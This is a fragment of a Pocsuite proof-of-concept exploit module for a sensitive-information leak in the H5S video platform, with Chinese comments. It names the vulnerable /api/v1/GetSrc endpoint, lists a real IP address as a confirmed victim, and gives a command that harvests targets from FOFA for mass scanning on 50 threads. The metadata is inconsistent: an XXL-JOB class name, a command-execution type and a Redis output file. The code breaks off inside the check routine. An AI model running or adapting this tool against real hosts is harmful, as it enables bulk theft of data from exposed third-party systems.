...
class XXLJOBPOC(POCBase):
    ...
    appName = "h5s视频平台敏感信息泄露"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://221.181.88.134:18080"]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ["requests"]  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
                攻击者可直接通过查询信息接收获取大量敏感信息
            """  # 漏洞简要描述
    pocDesc = """
    pocsuite -r ./pocs/h5s.py   --dork-fofa \"H5S视频平台\"  --max-size 500 --save-file ./redis_res.txt --threads 50
            """  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        result = []
        aurl = f"{self.url}/api/v1/GetSrc"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "If-Modified-Since": "Wed, 29 Sep 2021 06:13:40 GMT", "If-None-Match": "\"61540414.7841\"", "Content-Type": "application/x-www-form-urlencoded"}
        try:
